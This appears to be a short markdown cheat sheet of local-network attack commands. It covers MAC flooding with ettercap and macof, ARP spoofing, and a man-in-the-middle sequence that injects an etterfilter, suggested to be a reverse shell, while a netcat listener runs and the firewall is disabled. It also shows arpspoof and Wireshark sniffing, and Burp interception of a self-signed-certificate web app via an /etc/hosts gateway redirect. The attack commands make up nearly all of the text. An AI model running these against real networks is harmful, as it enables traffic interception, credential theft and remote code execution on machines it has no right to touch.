### Tools: Ettercap, macof, ip, nmap, ping, Burpsuite

## Requirements: Root the machine that has access to more machines on its network, then scan with a port scanner (nmap)

# MAC FLODDING

#### 1) 

    ettercap -T -i INTERFACE -P rand_flood -q -w /tmp/tcpdump3.pcap

#### 2)

    macof -i INTERFACE

# ARP SPOOFING

#### 

    ettercap -T -i INTERFACE_2 -M arp

# MAN IN THE MIDDLE MANIPULATION

#### 1) Create a filter (preferably a reverse shell)

#### 2) Compile it with etterfilter

#### 

    etterfilter example.ecf -o example.ef

#### 3) 

    nc -lvnp PORT &

#### 4) 

    ufw disable

#### 5) 

    ettercap -T -i INTERFACE_2 -M arp -F example.ef

# MITM EXAMPLE 2
 
#### 1) 

    sudo arpspoof -i INTERFACE -t TARGET_MACHINE DEFAULT_GATEWAY

#### 2) 

    sudo wireshark (Capture live packets)

#### 3) 

    Filter on wireshark on what traffic you want to capture

## TIP: Attacker and target should be connected in the same network for this to work

# MITM EXAMPLE 3

## Requirements: Webapp uses self-signed certificate instead form a trusted CA

### Steps:

#### 1) Configure Burp by going to:

Select Proxy -> Toggle Intercept on -> Proxy Settings

#### 2) Now, on Proxy settings do:

Proxy listeners -> Add button -> Specific Address is our attacking machine and bind port is 8080 -> OK to apply configs

#### 3) Set our own machine as a gateway for the network we want to target

    sudo echo "OUR_ATTACK_IP gateway_dns_name" >> /etc/hosts

#### 4) And now, wait for profit, we are now MitM to sniff for traffic from other machines in the network
